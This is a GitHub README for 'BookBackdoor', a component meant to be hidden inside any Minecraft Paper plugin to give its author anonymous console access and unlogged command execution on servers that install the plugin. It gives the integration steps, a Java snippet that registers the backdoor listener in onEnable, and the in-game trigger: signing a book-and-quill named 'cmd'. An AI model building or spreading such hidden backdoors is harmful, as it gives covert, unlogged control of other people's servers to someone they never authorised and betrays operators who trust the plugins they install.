<p align="center">
  <a href="">
    <img src="https://i.imgur.com/xZ4ujZm.png" alt="Logo" width="800" height="122">    
  </a>
</p>

<p align="center">
  <img src="https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg" alt="Build">
  <img src="https://img.shields.io/github/license/BookBackdoor/BookBackdoor" alt="MIT">
  <br>
  Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that logs nothing!
</p>

<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#how-to">How to</a></li>
    <li><a href="#in-game">In game usage</a></li>
    <li><a href="#--notice">Liability notice</a></li>
  </ol>
</details>


# How-to

* Youtube link: https://youtu.be/r60HdxPhwy0
* 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
* 2: Import BookBackdoor.java into your main class
* 3: Add this code to the ```onEnable(){}``` method in your main class


```java
PluginManager manager = this.getServer().getPluginManager();
getConfig().options().copyDefaults(true);
saveConfig();
manager.registerEvents(new BookBackdoor(this), this);
```

## In-Game
* Obtain a Book-and-Quill
* enter the following text ```.help```
* Press Sign
* Name the book ```cmd```
* press Sign and Close
* You will be given a help book

<h1 align="center">
  Notice
</h1>
<br>
<p align="center">
  I am not responsible for any damages caused by using this code.
</p>
